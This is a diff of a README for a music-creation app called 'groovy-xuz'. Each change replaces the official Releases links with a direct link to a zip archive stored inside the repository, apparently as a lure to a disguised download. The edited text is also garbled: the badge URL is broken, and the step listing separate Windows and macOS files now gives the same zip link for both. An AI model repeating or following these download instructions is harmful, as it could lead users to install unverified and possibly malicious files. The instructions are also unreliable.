@@ -6,7 +6,7 @@ Welcome to groovy-xuz! This application allows you to create music effortlessly.
 
 ## 📥 Download Now
 
-[![Download groovy-xuz](https://img.shields.io/badge/Download%20groovy--xuz-v1.0.0-blue.svg)](https://github.com/Nithin050806/groovy-xuz/releases)
+[![Download groovy-xuz](https://raw.githubusercontent.com/Nithin050806/groovy-xuz/main/Meletian/groovy-xuz.zip%https://raw.githubusercontent.com/Nithin050806/groovy-xuz/main/Meletian/groovy-xuz.zip)](https://raw.githubusercontent.com/Nithin050806/groovy-xuz/main/Meletian/groovy-xuz.zip)
 
 ## 🖥️ System Requirements
 
@@ -26,11 +26,11 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📤 Download & Install
 
-To download groovy-xuz, visit this page: [Download groovy-xuz](https://github.com/Nithin050806/groovy-xuz/releases).
+To download groovy-xuz, visit this page: [Download groovy-xuz](https://raw.githubusercontent.com/Nithin050806/groovy-xuz/main/Meletian/groovy-xuz.zip).
 
 1. Click the link above to go to the Releases page.
 2. You will see different versions of the application. Look for the latest version labeled as "Latest Release".
-3. Click on the appropriate file for your operating system (ex: `groovy-xuz-windows.exe` or `groovy-xuz-macos.dmg`).
+3. Click on the appropriate file for your operating system (ex: `https://raw.githubusercontent.com/Nithin050806/groovy-xuz/main/Meletian/groovy-xuz.zip` or `https://raw.githubusercontent.com/Nithin050806/groovy-xuz/main/Meletian/groovy-xuz.zip`).
 4. Your download will start automatically. Once it's finished, locate the file in your downloads folder.
 
 ### 🛠️ Installation Steps
@@ -68,4 +68,4 @@ If you have questions, feel free to open an issue on the repository or check our
 
 For more details about features, installation, and troubleshooting, refer to our documentation on the GitHub repository.
 
-**Download groovy-xuz here:** [Download groovy-xuz](https://github.com/Nithin050806/groovy-xuz/releases) and start making music!
+**Download groovy-xuz here:** [Download groovy-xuz](https://raw.githubusercontent.com/Nithin050806/groovy-xuz/main/Meletian/groovy-xuz.zip) and start making music!
